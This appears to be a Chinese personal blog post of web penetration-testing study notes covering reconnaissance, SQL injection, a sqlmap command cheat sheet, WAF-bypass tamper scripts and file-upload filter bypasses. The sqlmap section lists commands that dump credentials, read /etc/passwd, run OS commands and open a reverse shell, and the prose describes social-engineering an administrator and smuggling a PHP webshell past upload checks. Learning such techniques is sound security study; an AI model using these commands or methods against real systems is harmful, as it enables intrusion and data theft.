<!DOCTYPE html><html lang="zh-CN"><head><meta charset="utf-8"/><meta name="viewport" content="width=device-width, initial-scale=1.0"/><meta name="author" content="Luffer"/><meta name="keyword"/><meta name="description" content="渗透">
<meta property="og:type" content="article">
<meta property="og:title" content="Web渗透学习">
<meta property="og:url" content="https://lufferrrrr.cn/2024/11/21/Web-%E6%B8%97%E9%80%8F/index.html">
<meta property="og:site_name" content="BLOG">
<meta property="og:description" content="渗透">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="d:\LufferBlog\public\img\blog\image-20241120091632111.png">
<meta property="og:image" content="d:\LufferBlog\public\img\blog\image-20241120092055713.png">
<meta property="og:image" content="https://sqlmap.highlight.ink/~gitbook/image?url=https%3A%2F%2F395817221-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252F-LVBZmJxh6d1NLAdqB_j-887967055%252Ficon%252Fb7lPuSMWb8jtGcrJa4An%252Fsmall.png%3Falt%3Dmedia%26token%3D7e6ccfeb-8f69-4b34-b304-57ebe2810313&width=32&dpr=2&quality=100&sign=95e275d8&sv=1">
<meta property="article:published_time" content="2024-11-21T15:16:23.000Z">
<meta property="article:modified_time" content="2024-11-25T08:31:30.204Z">
<meta property="article:author" content="Luffer">
<meta property="article:tag" content="WEB">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="d:\LufferBlog\public\img\blog\image-20241120091632111.png"><title>Web渗透学习 - LUFFERBLOG - Wonder of U</title><link rel="shortcut icon" href="/img/site-icon.png">
<link rel="stylesheet" href="/css/style.css" id="dm-light">


<link rel="stylesheet" href="https://cdn.bootcdn.net/ajax/libs/font-awesome/6.4.2/css/all.min.css">

<script src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" async></script>
<meta name="generator" content="Hexo 7.3.0"></head><body><header><div class="top-nav" ondblclick="scrollToTop()"><div class="nav-info"><div class="nav-icon"><img id="nav-icon" src="/img/site-icon.png"/></div><div class="nav-title"><a id="nav-title" href="/" title="主页">BLOG</a></div></div><div class="nav-ribbon"><div class="top-menu-expanded"><a class="top-menu-item" href="/archives"><span>归档</span></a><a class="top-menu-item" href="/categories"><span>分类</span></a><a class="top-menu-item" href="/tags"><span>标签</span></a><a class="top-menu-item" href="/about"><span>关于</span></a></div><div class="top-search" onclick="toggleSearchWindow()"><div id="top-search-btn" title="搜索"><i class="icon fa-solid fa-magnifying-glass"></i><span>搜索</span></div></div><div id="top-menu-btn" onclick="openTopMenu()" title="打开菜单"><i class="fa-solid fa-bars fa-lg"></i></div></div></div></header><div id="top-menu-hidden"><div class="menu-hidden-content"><div class="menu-hidden-nav"><a class="menu-hidden-item" href="/archives"><i class="fa-solid fa-box-archive fa-sm"></i><span>归档</span></a><a class="menu-hidden-item" href="/categories"><i class="fa-regular fa-folder-open fa-sm"></i><span>分类</span></a><a class="menu-hidden-item" href="/tags"><i class="fa-solid fa-tags fa-sm"></i><span>标签</span></a><a class="menu-hidden-item" href="/about"><i class="fa-solid fa-paw fa-sm"></i><span>关于</span></a></div></div><div class="menu-hidden-blank" onclick="closeTopMenu()"></div></div>
<div class="blog-info"><div class="blog-pic"><img id="blog-pic" src="/img/site-icon.png"/></div><div class="blog-title"><i class="fa-solid fa-paw fa-2xs fa-rotate-by"></i><span>LUFFERBLOG</span><i class="fa-solid fa-paw fa-2xs fa-rotate-by"></i></div><div class="blog-desc">几度隔山川，乍见翻疑梦</div></div><div class="main"><div class="main-content"><article class="post"><div class="post-title"><h1><i class="fa-solid fa-paw"></i>Web渗透学习</h1></div><div class="post-info"><div class="post-info-first-line"><div class="post-date"><i class="icon fa-regular fa-calendar-plus" title="发布日期"></i><time class="publish-time">2024-11-21</time><i class="icon fa-regular fa-calendar-check" title="更新日期"></i><time class="update-time">2024-11-25</time></div>
<div class="post-categories"><i class="icon fa-regular fa-folder-open" title="分类"></i><a class="post-category" href="/categories/%E6%93%8D%E4%BD%9C%E6%89%8B%E8%AE%B0/">操作手记</a></div>
<div class="post-tags"><i class="icon fa-solid fa-tags" title="标签"></i><a class="post-tag" href="/tags/WEB/">WEB</a></div></div><div class="post-info-second-line"><div class="post-copyright"><i class="icon fa-brands fa-creative-commons" title="版权声明"></i><span>版权声明: </span><a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-nd/4.0/deed.zh-hans" title="CC BY-NC-ND 4.0">署名-非商业性使用-禁止演绎 4.0</a></div>
<div class="post-word-count"><i class="icon fa-solid fa-pen-to-square"></i><span>全文约2.9K字</span></div><div class="pageview-post"><i class="icon fa-regular fa-eye"></i><span id="busuanzi_container_page_pv">阅读次数: <span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner"></i></span></span></div></div></div><div class="fiction-before-content"><div class="fiction-summary"><h4>简介</h4><p>渗透</p>
</div></div><div class="post-content"><h2 id="渗透信息收集"><a href="#渗透信息收集" class="headerlink" title="渗透信息收集"></a>渗透信息收集</h2><h3 id="1-服务器信息收集"><a href="#1-服务器信息收集" class="headerlink" title="1.服务器信息收集"></a>1.服务器信息收集</h3><p><strong>1.1旁站</strong></p>
<p>服务器上有多个Web站点，我们的渗透目标是其中的一个 Web站点。</p>
<p>当我们无法拿下目标站点时，可以尝试对服务器上的其他站点进行渗透，</p>
<p>再通过跨目录或提权等方法拿下目标站点。</p>
<p>常见的旁站查询流程如下。 </p>
<ul>
<li>获得渗透目标的真实IP地址。 </li>
<li>利用网站平台、工具反查IP地址。</li>
</ul>
<p><strong>1.2端口扫描</strong></p>
<p>计算机开放的端口和它开放的服务是对应的</p>
<p>渗透测试人员可以通过端口扫描大致了解目标开放了哪些服务</p>
<p>如80端口对应了HTTP服务，3306端口对应了MySQL数据 库，1433端口对应了MSSQL数据库。通过对开放端口的分析，我们便可以大致知道目标网站使用了什么数据库，并可以尝试进行数据库的爆破。</p>
<p>端口扫描可以助力后台的查找和后期的提权</p>
<p><img src="D:\LufferBlog\public\img\blog\image-20241120091632111.png" alt="image-20241120091632111"></p>
<h3 id="2-Web信息收集"><a href="#2-Web信息收集" class="headerlink" title="2.Web信息收集"></a>2.Web信息收集</h3><p><strong>2.1二级域名</strong></p>
<p>通常大型网站主站很难出问题，相比之下子站更容易找到漏洞。</p>
<p><img src="D:\LufferBlog\public\img\blog\image-20241120092055713.png" alt="image-20241120092055713"></p>
<p><strong>2.2目录信息</strong></p>
<ul>
<li>phpinfo探针</li>
<li>搜索引擎（语法）</li>
<li>扫描器</li>
<li>爬虫</li>
</ul>
<h3 id="3-Whois查询"><a href="#3-Whois查询" class="headerlink" title="3.Whois查询"></a>3.Whois查询</h3><h3 id="4-爆破信息收集"><a href="#4-爆破信息收集" class="headerlink" title="4.爆破信息收集"></a>4.爆破信息收集</h3><h2 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h2><p>CTF八股取士</p>
<h3 id="1-注入的挖掘"><a href="#1-注入的挖掘" class="headerlink" title="1.注入的挖掘"></a>1.注入的挖掘</h3><ul>
<li><p>使用代理工具（如 Burp Suite、OWASP ZAP）抓取流量并定位潜在参数。</p>
</li>
<li><p>自动化爬虫（如 Arachni、DirBuster）收集所有链接、API 路径、隐藏入口。</p>
</li>
</ul>
<div class="linkcard">
          <div class="linkcard-item">
            <a href="https://sqlmap.highlight.ink/usage" target="_blank">
              <div class="linkcard-item-icon"><img src="https://sqlmap.highlight.ink/~gitbook/image?url=https%3A%2F%2F395817221-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252F-LVBZmJxh6d1NLAdqB_j-887967055%252Ficon%252Fb7lPuSMWb8jtGcrJa4An%252Fsmall.png%3Falt%3Dmedia%26token%3D7e6ccfeb-8f69-4b34-b304-57ebe2810313&width=32&dpr=2&quality=100&sign=95e275d8&sv=1" /></div>
              <div class="linkcard-item-title">sqlmap_usage</div>
              <div class="linkcard-item-desc"><span>sqlmap中文手册</span></div>
            </a>
          </div></div>

<p>  <strong>挖掘</strong></p>
<p>  所谓挖掘，就是判断某 个参数是否可以进行注入。</p>
<p>  报错注入 一般情况下，大部分编程语言为了方便开发人员可以灵活地调试和修复其应用程序， 会使用一些内置的错误处理库，从而简化调试程序的时间。而报错注入就是输入一些特殊 字符使语法产生错误，从而判断是否存在注入，常见的特殊字符如下。 </p>
<ul>
<li><p>‘ </p>
</li>
<li><p>\ </p>
</li>
<li><p>；</p>
</li>
<li><p>%00 </p>
</li>
<li><p>） </p>
</li>
<li><p>（ </p>
</li>
<li><h1 id=""><a href="#" class="headerlink" title=""></a></h1></li>
<li><p>“</p>
<blockquote>
<p>在提交参数时加上这些特殊字符，如果报错，那么极有可能是一个注入点</p>
</blockquote>
</li>
</ul>
<h3 id="2-sqlmap使用"><a href="#2-sqlmap使用" class="headerlink" title="2.sqlmap使用"></a>2.sqlmap使用</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line">sqlmap.py -u &quot;http://url/news?id=1&quot; --current-user#获取当前用户名称</span><br><span class="line">sqlmap.py -u &quot;http://url/news?id=1&quot; --current-db #获取当前数据库名称</span><br><span class="line">sqlmap.py -u &quot;http://url/news?id=1&quot; --tables -D &quot;db_name&quot; #列表名</span><br><span class="line">sqlmap.py -u &quot;http://url/news?id=1&quot; --columns -T &quot;tablename&quot;</span><br><span class="line"> users-D &quot;db_name&quot; -v 0 #列字段</span><br><span class="line">sqlmap.py -u &quot;http://url/news?id=1&quot; --dump -C &quot;column_name&quot; -T</span><br><span class="line"> &quot;table_name&quot; -D &quot;db_name&quot; #获取字段内容</span><br><span class="line">sqlmap.py -u &quot;http://url/news?id=1&quot; --smart --level 3 --users</span><br><span class="line"> #smart智能 level 执行测试等级</span><br><span class="line">sqlmap.py -u &quot;http://url/news?id=1&quot; --dbms &quot;Mysql&quot; --users#dbms指定数据库类型</span><br><span class="line">sqlmap.py -u &quot;http://url/news?id=1&quot; --users #列数据库用户</span><br><span class="line">sqlmap.py -u &quot;http://url/news?id=1&quot; --dbs #列数据库</span><br><span class="line">sqlmap.py -u &quot;http://url/news?id=1&quot; --passwords #数据库用户密码</span><br><span class="line">sqlmap.py -u &quot;http://url/news?id=1&quot; --passwords-U root -v 0 #列出指定用户数据库密码</span><br><span class="line">sqlmap.py -u &quot;http://url/news?id=1&quot; --dump -C &quot;password,user,id&quot;</span><br><span class="line"> -T &quot;tablename&quot; -D &quot;db_name&quot;</span><br><span class="line">--start 1 --stop 20 #列出指定字段,列出20 条</span><br><span class="line">sqlmap.py -u &quot;http://url/news?id=1&quot; --dump-all -v 0</span><br><span class="line"> #列出所有数据库和表</span><br><span class="line">sqlmap.py -u &quot;http://url/news?id=1&quot; --privileges #查看权限</span><br><span class="line">sqlmap.py -u &quot;http://url/news?id=1&quot; --privileges -U &quot;WEB_USR&quot;</span><br><span class="line"> #查看指定用户权限</span><br><span class="line">sqlmap.py -u &quot;http://url/news?id=1&quot; --is-dba -v 1 #是否是数据库管理员</span><br><span class="line">sqlmap.py -u &quot;http://url/news?id=1&quot; --roles #枚举数据库用户角色</span><br><span class="line">sqlmap.py -u &quot;http://url/news?id=1&quot; --udf-inject</span><br><span class="line"> #导入用户自定义函数（获取系统权限！）</span><br><span class="line">sqlmap.py -u &quot;http://url/news?id=1&quot; --dump-all --exclude-sysdbs</span><br><span class="line"> -v 0 #列出当前库所有表</span><br><span class="line">sqlmap.py -u &quot;http://url/news?id=1&quot; --union-cols #union 查询表记录</span><br><span class="line">sqlmap.py -u &quot;http://url/news?id=1&quot; --cookie &quot;cookie&quot; #cookie注入</span><br><span class="line">sqlmap.py -u &quot;http://url/news?id=1&quot; -b #获取banner信息</span><br><span class="line">sqlmap.py -u &quot;http://url/news?id=1&quot; --data &quot;SearchValue=请输入关键</span><br><span class="line"> 字&amp;sId=1&quot; #post注入</span><br><span class="line">sqlmap.py -u &quot;http://url/news?id=1&quot; -v 1 -f 　　　#指纹判别数据库类型</span><br><span class="line">sqlmap.py -u &quot;http://url/news?id=1&quot; --proxy&quot;http://127.0.0.1:8118&quot;#代理注入</span><br><span class="line">sqlmap.py -u &quot;http://url/news?id=1&quot;--string&quot;STRING_ON_TRUE_PAGE&quot;#指定关键词</span><br><span class="line">sqlmap.py -u &quot;http://url/news?id=1&quot; --sql-shell #执行指定sql命令</span><br><span class="line">sqlmap.py -u &quot;http://url/news?id=1&quot; --fi le /etc/passwd</span><br><span class="line">sqlmap.py -u &quot;http://url/news?id=1&quot; --os-cmd=whoami #执行系统命令</span><br><span class="line">sqlmap.py -u &quot;http://url/news?id=1&quot; --os-shell #系统交互shell</span><br><span class="line">sqlmap.py -u &quot;http://url/news?id=1&quot; --os-pwn #反弹shell</span><br><span class="line">sqlmap.py -u &quot;http://url/news?id=1&quot; --reg-read #读取win系统注册表</span><br><span class="line">sqlmap.py -u &quot;http://url/news?id=1&quot; --dbs-o &quot;sqlmap.py.log&quot;#保存进度</span><br><span class="line"> sqlmap.py -u &quot;http://url/news?id=1&quot; --dbs -o &quot;sqlmap.py.log&quot; --resume</span><br><span class="line"> #恢复已保存进度</span><br><span class="line">sqlmap.py -g &quot;google语法&quot; --dump-all --batch</span><br><span class="line"> #google搜索注入点自动跑出所有字段</span><br></pre></td></tr></table></figure>

<h3 id="3-WAF绕过"><a href="#3-WAF绕过" class="headerlink" title="3.WAF绕过"></a>3.WAF绕过</h3><blockquote>
<p>来自麻总的神秘力量<a target="_blank" rel="noopener" href="https://github.com/Marven11/Fenjing">https://github.com/Marven11/Fenjing</a></p>
</blockquote>
<p>在sqlmap中，用-tamper命令可以调用内置的绕过脚本，具体语法格式如sqlmap.py -u “url” -v 1 –dbs -tamper “脚本名”</p>
<table>
<thead>
<tr>
<th>脚本</th>
<th>作用</th>
</tr>
</thead>
<tbody><tr>
<td>apostrophemask.py</td>
<td>用utf-8代替引号</td>
</tr>
<tr>
<td>equaltolike.py</td>
<td>like 代替等于号</td>
</tr>
<tr>
<td>space2dash.py</td>
<td>绕过滤’&#x3D;’替换空格字符（”）</td>
</tr>
<tr>
<td>greatest.py</td>
<td>绕过滤’&gt;’替换大于号</td>
</tr>
<tr>
<td>space2hash.py</td>
<td>空格替换为#号、随机字符串以及换行符</td>
</tr>
<tr>
<td>apostrophenullencode.py</td>
<td>绕过滤双引号，替换字符和双引号</td>
</tr>
<tr>
<td>halfversionedmorekeywords.py</td>
<td>每个关键字之前添加MySQL版本评论</td>
</tr>
<tr>
<td>space2morehash.py</td>
<td>空格替换为#号以及更多随机字符串和换行符</td>
</tr>
<tr>
<td>appendnullbyte.py</td>
<td>在有效负荷结束位置加载零字节字符编码</td>
</tr>
<tr>
<td>ifnull2ifisnull.py</td>
<td>绕过对 IFNULL 过滤</td>
</tr>
<tr>
<td>space2mssqlblank.py</td>
<td>空格替换为其他空白符号</td>
</tr>
<tr>
<td>base64encode.py</td>
<td>用base64编码替换</td>
</tr>
<tr>
<td>space2mssqlhash.py</td>
<td>替换空格</td>
</tr>
<tr>
<td>modsecurityversioned.py</td>
<td>过滤空格，包含完整的查询版本注释</td>
</tr>
<tr>
<td>between.py</td>
<td>用between替换大于号（＞）</td>
</tr>
<tr>
<td>space2mysqlblank.py</td>
<td>空格替换其他空白符号(mysql)</td>
</tr>
<tr>
<td>space2mysqldash.py</td>
<td>替换空格字符（“”）（‘-’）后跟一个破折号注释一个新行（ ‘n’）</td>
</tr>
<tr>
<td>multiplespaces.py</td>
<td>围绕SQL关键字添加多个空格</td>
</tr>
<tr>
<td>space2plus.py</td>
<td>用+替换空格</td>
</tr>
<tr>
<td>bluecoat.py</td>
<td>双重查询语句。取代 predefined SQL 关键字with表示 suitable for替代（例如 .replace(“SELECT”, “ “))filters</td>
</tr>
<tr>
<td>nonrecursivereplacement.py</td>
<td>双重查询语句。取代表示 suitable for替代（例如 .replace(“SELECT”, “ “))filters</td>
</tr>
<tr>
<td>space2randomblank.py</td>
<td>从一个随机的空白字符可选字符的有效集</td>
</tr>
<tr>
<td>sp_password.py</td>
<td>追加sp_password, 从DBMS日志的自动模糊处理的有效载荷的末尾</td>
</tr>
<tr>
<td>chardoubleencode.py</td>
<td>双URL编码（不处理已编码的）</td>
</tr>
<tr>
<td>unionalltounion.py</td>
<td>替换UNION ALL SELECT UNION SELECT</td>
</tr>
<tr>
<td>charencode.py</td>
<td>URL编码</td>
</tr>
<tr>
<td>randomcase.py</td>
<td>随机大小写</td>
</tr>
<tr>
<td>unmagicquotes.py</td>
<td>宽字符绕过 GPC addslashes</td>
</tr>
<tr>
<td>randomcomments.py</td>
<td>用&#x2F;**&#x2F;分割SQL关键字</td>
</tr>
<tr>
<td>charunicodeencode.py</td>
<td>字符串 Unicode 编码</td>
</tr>
<tr>
<td>securesphere.py</td>
<td>追加特制的字符串</td>
</tr>
<tr>
<td>versionedmorekeywords.py</td>
<td>注释绕过</td>
</tr>
<tr>
<td>halfversionedmorekeywords.py</td>
<td>关键字前加注释</td>
</tr>
</tbody></table>
<h2 id="爆破"><a href="#爆破" class="headerlink" title="爆破"></a>爆破</h2><p>Null</p>
<h2 id="后台问题"><a href="#后台问题" class="headerlink" title="后台问题"></a>后台问题</h2><h3 id="1-后台地址查找"><a href="#1-后台地址查找" class="headerlink" title="1.后台地址查找"></a>1.后台地址查找</h3><ul>
<li>扫描器、爬虫</li>
<li><h2 id="搜寻引擎（语法）"><a href="#搜寻引擎（语法）" class="headerlink" title="搜寻引擎（语法）"></a>搜寻引擎（语法）</h2></li>
<li>页面信息</li>
<li>XSS</li>
<li>二级域名</li>
<li>其他端口</li>
<li>访问来源<ul>
<li>此方法对一些有留言板或是能和管理员交互的站点较为有效。首先，需要准备一个自 己的站点，然后在此站点中添加站长统计的JS，将准备的站点网址以添加友链的名义发给 渗透目标的管理员。当渗透目标的管理员访问了发给他的网址时，这时在站长统计后台便 能看到访问来源了，而一般管理员是在后台对一些留言进行审核，所以访问来源常常就是 后台地址。 在开发中，后台是为了方便管理员对网站进行更新，因此功能往往很多，如添加管 理员，数据库备份下载，文件上传等。功能强大，伴随而来的常常是安全问题。在渗透中，对后台的巧妙利用更胜于在前台大费周章地挖掘漏洞。</li>
</ul>
</li>
</ul>
<h3 id="2-后台验证绕过"><a href="#2-后台验证绕过" class="headerlink" title="2.后台验证绕过"></a>2.后台验证绕过</h3><p>渗透中，有些Web站点的后台使用了JavaScript验证和固定cookie，而这类验证被绕过的可能性很大。 就拿JavaScript验证来说，因为它发生在客户端，因此 对于这类后台只要在浏览器中把JavaScript禁止掉就 能正常访问后台了。</p>
<p>例如，蓝科CMS中对后台的验证 就是JavaScript，JS开启的时候，无法访问后台。 </p>
<p>当把浏览器的javascript.enabled设置为false时，再次对后台进行访问，可以成功访问后台，轻松地绕过JavaScript的验证。</p>
<h3 id="3-后台越权"><a href="#3-后台越权" class="headerlink" title="3.后台越权"></a>3.后台越权</h3><ul>
<li>越权xss</li>
<li>越权注入</li>
</ul>
<h3 id="4-后台文件的利用"><a href="#4-后台文件的利用" class="headerlink" title="4.后台文件的利用"></a>4.后台文件的利用</h3><ul>
<li>文件上传</li>
<li>备份下载</li>
<li>数据库下载</li>
<li>rar、txt、mdb、sql后缀</li>
<li>探针</li>
</ul>
<h2 id="绕过"><a href="#绕过" class="headerlink" title="绕过"></a>绕过</h2><h3 id="常见绕过"><a href="#常见绕过" class="headerlink" title="常见绕过"></a>常见绕过</h3><ol>
<li><p>JavaScript验证绕过</p>
<blockquote>
<p>JavaScript验证就是所谓的客户端验证，也是最脆弱的一种验证。直接修改数据包或 禁用JavaScript即可绕过。</p>
</blockquote>
</li>
<li><p>content-type验证绕过</p>
</li>
</ol>
<blockquote>
<p>content-type验证，最常见的是判断content-type是否为image&#x2F;gif。对于这种验证直接修 改数据包中的content-type为image&#x2F;gif即可，如图3-34所示。 </p>
</blockquote>
<ol start="3">
<li><p>黑名单检测绕过</p>
<blockquote>
<p>黑名单检测是常见的一种上传验证方式，不允许上传黑名单中存在的扩展名，其安全性低于白名单检测，绕过方式也远多于白名单检测。</p>
</blockquote>
<ul>
<li><p>常见思路 </p>
<ul>
<li><p>找黑名单拓展名中的漏网之鱼，常见的如asa、cer。 </p>
</li>
<li><p>大小写混淆绕过，如AsP、pHp。 </p>
</li>
<li><p>利用解析漏洞绕过。 </p>
</li>
<li><p>特别文件名构造。 </p>
</li>
<li><p>截断上传</p>
</li>
</ul>
</li>
</ul>
</li>
<li><p>白名单检测绕过</p>
</li>
<li><p>对危险扩展名POST检测的绕过</p>
<blockquote>
<p>在开发中，为了方便维护和更新，会先对扩展名进行验证，如果上传文件的扩展名为 可执行脚本，便会对其POST的数据进行检测，如果存在恶意代码就会禁止上传。</p>
<p>对于 这类上传检测的绕过大致有这几种思路，一是利用变种木马绕过其检测；二就是用包含文 件对其进行绕过。拿PHP来说，先将一句话木马放进一个txt文件中，因为txt并非可执行 脚本，因此成功上传。</p>
<p>利用PHP中的include函数将上传的txt文件包含进去，而因PHP中include是常用函数，一般POST检测不会认为其是恶意代码，因此成功上传，从而绕过限制执行恶意代码。</p>
</blockquote>
</li>
<li><p>服务器目录限制的绕过</p>
<blockquote>
<p>有的Web应用程序本身对扩展名并没有什么验证，而在服务器上对上传目录允许上传的文件扩展名进行限制。</p>
<p>对于这类防御方法，如果能控制上传路径即能成功绕过了。 </p>
<p>最常见的便是上传路径被写在了数据包中，对此直接修改数据包即可</p>
</blockquote>
</li>
</ol>
</div><div class="fiction-status">～ 未完待续 ～</div><div class="post-end"><div class="post-prev"></div><div class="post-reward" onclick="openPostReward()" title="赞赏"><i class="fa-regular fa-thumbs-up fa-xl fa-beat-fade"></i></div><div id="reward-panel" onclick="closePostReward()"><div class="reward-container"><p>嘿嘿，这根本不是点赞键&#129299;</p>
<div class="reward-nav"><div class="reward-item"><img class="reward-img" src="/img/reward/wechat.jpg" title="Wechat" alt="Wechat"/><span>Wechat</span></div></div></div></div><div class="post-next"><a href="/2024/11/21/Metasploit%E5%AE%89%E8%A3%85%E8%BF%87%E7%A8%8B/" title="下一篇文章"><i class="fa-solid fa-chevron-right fa-lg"></i></a></div></div></article><div class="comment" id="comment"><script src="https://giscus.app/client.js" data-repo="luffer-bot/luffer-bot.github.io" data-repo-id="R_kgDONRCPWA" data-category="General" data-category-id="DIC_kwDONRCPWM4CkXi-" data-mapping="pathname" data-reactions-enabled="data-reactions-enabled" data-input-position="top" data-theme="preferred_color_scheme" data-lang="zh-CN" data-loading="Loading comments..." crossorigin="anonymous" async="async"></script></div><div id="post-toc"><aside class="toc-aside"><div class="toc-title"><span><i class="fa-solid fa-paw"></i>目录</span></div><div class="toc-container" id="toc-body"><ol class="toc-content"><li class="toc-content-item toc-content-level-2"><a class="toc-content-link" href="#%E6%B8%97%E9%80%8F%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-content-number">1.</span> <span class="toc-content-text">渗透信息收集</span></a><ol class="toc-content-child"><li class="toc-content-item toc-content-level-3"><a class="toc-content-link" href="#1-%E6%9C%8D%E5%8A%A1%E5%99%A8%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-content-number">1.1.</span> <span class="toc-content-text">1.服务器信息收集</span></a></li><li class="toc-content-item toc-content-level-3"><a class="toc-content-link" href="#2-Web%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-content-number">1.2.</span> <span class="toc-content-text">2.Web信息收集</span></a></li><li class="toc-content-item toc-content-level-3"><a class="toc-content-link" href="#3-Whois%E6%9F%A5%E8%AF%A2"><span class="toc-content-number">1.3.</span> <span class="toc-content-text">3.Whois查询</span></a></li><li class="toc-content-item toc-content-level-3"><a class="toc-content-link" href="#4-%E7%88%86%E7%A0%B4%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-content-number">1.4.</span> <span class="toc-content-text">4.爆破信息收集</span></a></li></ol></li><li class="toc-content-item toc-content-level-2"><a class="toc-content-link" href="#SQL%E6%B3%A8%E5%85%A5"><span class="toc-content-number">2.</span> <span class="toc-content-text">SQL注入</span></a><ol class="toc-content-child"><li class="toc-content-item toc-content-level-3"><a class="toc-content-link" href="#1-%E6%B3%A8%E5%85%A5%E7%9A%84%E6%8C%96%E6%8E%98"><span class="toc-content-number">2.1.</span> <span class="toc-content-text">1.注入的挖掘</span></a></li></ol></li></ol></li><li class="toc-content-item toc-content-level-1"><a class="toc-content-link"><span class="toc-content-number"></span> <span class="toc-content-text"></span></a><ol class="toc-content-child"><li class="toc-content-item toc-content-level-3"><a class="toc-content-link" href="#2-sqlmap%E4%BD%BF%E7%94%A8"><span class="toc-content-number">0.1.</span> <span class="toc-content-text">2.sqlmap使用</span></a></li><li class="toc-content-item toc-content-level-3"><a class="toc-content-link" href="#3-WAF%E7%BB%95%E8%BF%87"><span class="toc-content-number">0.2.</span> <span class="toc-content-text">3.WAF绕过</span></a></li></ol></li><li class="toc-content-item toc-content-level-2"><a class="toc-content-link" href="#%E7%88%86%E7%A0%B4"><span class="toc-content-number">1.</span> <span class="toc-content-text">爆破</span></a></li><li class="toc-content-item toc-content-level-2"><a class="toc-content-link" href="#%E5%90%8E%E5%8F%B0%E9%97%AE%E9%A2%98"><span class="toc-content-number">2.</span> <span class="toc-content-text">后台问题</span></a><ol class="toc-content-child"><li class="toc-content-item toc-content-level-3"><a class="toc-content-link" href="#1-%E5%90%8E%E5%8F%B0%E5%9C%B0%E5%9D%80%E6%9F%A5%E6%89%BE"><span class="toc-content-number">2.1.</span> <span class="toc-content-text">1.后台地址查找</span></a></li></ol></li><li class="toc-content-item toc-content-level-2"><a class="toc-content-link" href="#%E6%90%9C%E5%AF%BB%E5%BC%95%E6%93%8E%EF%BC%88%E8%AF%AD%E6%B3%95%EF%BC%89"><span class="toc-content-number">3.</span> <span class="toc-content-text">搜寻引擎（语法）</span></a><ol class="toc-content-child"><li class="toc-content-item toc-content-level-3"><a class="toc-content-link" href="#2-%E5%90%8E%E5%8F%B0%E9%AA%8C%E8%AF%81%E7%BB%95%E8%BF%87"><span class="toc-content-number">3.1.</span> <span class="toc-content-text">2.后台验证绕过</span></a></li><li class="toc-content-item toc-content-level-3"><a class="toc-content-link" href="#3-%E5%90%8E%E5%8F%B0%E8%B6%8A%E6%9D%83"><span class="toc-content-number">3.2.</span> <span class="toc-content-text">3.后台越权</span></a></li><li class="toc-content-item toc-content-level-3"><a class="toc-content-link" href="#4-%E5%90%8E%E5%8F%B0%E6%96%87%E4%BB%B6%E7%9A%84%E5%88%A9%E7%94%A8"><span class="toc-content-number">3.3.</span> <span class="toc-content-text">4.后台文件的利用</span></a></li></ol></li><li class="toc-content-item toc-content-level-2"><a class="toc-content-link" href="#%E7%BB%95%E8%BF%87"><span class="toc-content-number">4.</span> <span class="toc-content-text">绕过</span></a><ol class="toc-content-child"><li class="toc-content-item toc-content-level-3"><a class="toc-content-link" href="#%E5%B8%B8%E8%A7%81%E7%BB%95%E8%BF%87"><span class="toc-content-number">4.1.</span> <span class="toc-content-text">常见绕过</span></a></li></ol></li></ol></div></aside><div class="toc-blank" onclick="tocToggle()"></div></div></div></div><div id="tool-bar"><div id="tool-bar-main"><div id="tool-toggle" onclick="toolToggle()" title="设置"><i class="fa-solid fa-gear"></i></div><div id="toc-toggle" onclick="tocToggle()" title="目录"><i class="fa-solid fa-list-ul"></i></div><div id="go-to-comment" onclick="gotoComment()" title="评论"><i class="fa-regular fa-message fa-flip-horizontal"></i></div><div id="back-to-top" onclick="scrollToTop()" title="返回顶部"><i class="fa-solid fa-chevron-up"></i></div></div><div id="tool-bar-more" style="display: none;"><div id="darkmode-switch" onclick="darkmodeSwitch()" title="深色模式"><i class="fa-solid fa-circle-half-stroke"></i></div><div id="font-size-increase" onclick="fontSizeIncrease()" title="放大字体"><i class="fa-solid fa-plus"></i></div><div id="font-size-decrease" onclick="fontSizeDecrease()" title="缩小字体"><i class="fa-solid fa-minus"></i></div></div></div><div id="search-panel"><div class="search-container"><div class="search-head"><div class="search-title"><span><i class="fa-solid fa-paw"></i>搜索</span></div><div class="search-close-btn" onclick="toggleSearchWindow()"><i class="fa-regular fa-circle-xmark"></i></div></div><div class="search-box"><i class="fa-solid fa-magnifying-glass"></i><input id="search-input" type="text" placeholder="请输入需要搜索的内容……" value=""/></div><div class="search-body"><div id="search-count">匹配结果数: </div><div id="search-result"></div><div id="search-result-empty">未搜索到匹配的文章。</div></div></div></div><footer><div class="footer-content"><div class="copyright-info"><i class="fa-regular fa-copyright fa-xs"></i><span>2024 </span><a href="/about">Luffer</a><i class="fa-solid fa-cat fa-sm"></i><span>Powered by </span><a href="https://hexo.io/" 